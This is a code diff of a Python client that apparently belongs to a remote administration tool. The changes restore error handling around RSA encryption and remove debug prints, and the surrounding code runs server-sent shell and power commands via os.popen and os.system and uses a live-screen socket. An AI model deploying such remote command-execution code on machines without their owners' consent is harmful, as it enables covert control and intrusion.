@@ -54,17 +54,18 @@ def encrypt(msg):
     fin_msg = b""
     for i in range(0, len(msg), 53):
         msg_part = msg[i:i + 53]
-        # try:
-        enc_msg = rsa.encrypt(msg_part, host_public_key)
+        try:
+            enc_msg = rsa.encrypt(msg_part, host_public_key)
 
-        # except OverflowError:
-        #     fin_msg = rsa.encrypt(b"overFlowError", host_public_key)
-        #     print("OverflowError")
-        #     break
-        # except:
-        #     print("Encryption error")
-        #     fin_msg = rsa.encrypt(b"error", host_public_key)
-        #     break
+        except OverflowError:
+            fin_msg = rsa.encrypt(b"overFlowError", host_public_key)
+            print("OverflowError")
+            break
+
+        except:
+            print("Encryption error")
+            fin_msg = rsa.encrypt(b"error", host_public_key)
+            break
         fin_msg += enc_msg
     return fin_msg
 
@@ -178,7 +179,6 @@ def convert_file_size(size):
         converted_size = round(size / 1000000000, 2)
         return f"{converted_size} {unit}"
     else:
-        print(size // 1000000000000)
         unit = "TB"
         converted_size = round(size / 1000000000000, 2)
         return f"{converted_size} {unit}"
@@ -229,7 +229,6 @@ def handle_server_response(command, client_socket, live_screen_socket):
 
     if cmd_type == "power":
         try:
-            print(f"cmd: {cmd}, system_type: {SYSTEM_TYPE}")
             power_command = power_commands[cmd.decode()][SYSTEM_TYPE]
             os.system(power_command)
         except KeyError:
@@ -237,11 +236,9 @@ def handle_server_response(command, client_socket, live_screen_socket):
         return "power", "done"
 
     elif cmd_type == "execute":
-        print(f"cmd: {cmd}")
         if cmd.split()[0] == b"cd":
             try:
                 os.chdir(cmd.decode().split()[1])
-                print(f"cmd.decode().split()[1]: {cmd.decode().split()[1]}")
                 output = os.getcwd()
             except FileNotFoundError:
                 output = "No such file or directory!"
@@ -250,6 +247,7 @@ def handle_server_response(command, client_socket, live_screen_socket):
             except IndexError:
                 os.chdir(os.path.expanduser("~"))
                 output = os.getcwd()
+
         else:
             try:
                 output = os.popen(cmd.decode()).read()
